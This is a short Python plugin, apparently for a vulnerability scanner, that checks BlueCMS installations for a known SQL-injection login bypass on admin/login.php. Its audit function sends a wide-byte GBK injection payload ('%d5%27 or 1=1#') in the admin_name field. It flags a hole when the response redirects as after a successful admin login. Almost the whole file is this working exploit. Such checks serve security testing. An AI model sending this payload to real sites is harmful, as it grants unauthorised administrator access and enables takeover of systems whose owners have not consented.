#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = bleucms
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-021082

def assign(service, arg):
    if service == 'bluecms':
        return True, arg

def audit(arg):
    payload = "admin/login.php"
    target = arg + payload
    post = "admin_name=hentai%d5%27%20or%201%3d1%23&admin_pwd=hentai&submit=%B5%C7%C2%BC&act=do_login"
    code, head, res, errcode, final_url = curl.curl2(target, post=post);
    if code == 200 and "setTimeout(\"location.replace('index.php')\",'2000')" in res:
        security_hole(target+' && post: admin_name=hentai%d5%27%20or%201%3d1%23&admin_pwd=hentai&submit=%B5%C7%C2%BC&act=do_login')

if __name__ == '__main__':
    from dummy import *
    audit(assign('bluecms', 'http://127.0.0.1/bluecms-1.6/')[1])